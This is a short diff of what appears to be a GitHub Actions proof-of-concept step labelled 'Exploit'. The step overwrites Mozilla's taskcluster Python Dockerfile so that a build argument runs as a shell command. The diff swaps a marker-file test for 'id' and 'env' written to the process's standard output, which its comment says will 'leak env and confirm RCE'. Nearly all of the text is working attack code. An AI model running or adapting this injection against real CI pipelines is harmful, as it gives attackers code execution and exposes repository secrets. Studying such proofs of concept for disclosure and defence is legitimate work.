@@ -10,13 +10,10 @@ jobs:
       - name: Exploit
         run: |
           # Overwrite Mozilla's Dockerfile with ours
-          echo -e "ARG PYTHON_VERSION\nFROM alpine:latest\nRUN sh -c \"\$PYTHON_VERSION\"" > taskcluster/docker/python/Dockerfile
+          echo -e "ARG PYTHON_VERSION\nFROM alpine:latest\nARG PYTHON_VERSION\nRUN sh -c \"\$PYTHON_VERSION\"" > taskcluster/docker/python/Dockerfile
 
-          # Inject malicious command
+          # Inject code to leak env and confirm RCE
           docker build \
-            --build-arg PYTHON_VERSION="echo HACKED > /hacked && id" \
+            --build-arg PYTHON_VERSION="id > /proc/1/fd/1 && env > /proc/1/fd/1" \
             -t hacked \
             ./taskcluster/docker/python
-
-          # Verify RCE
-          docker run --rm hacked cat /hacked
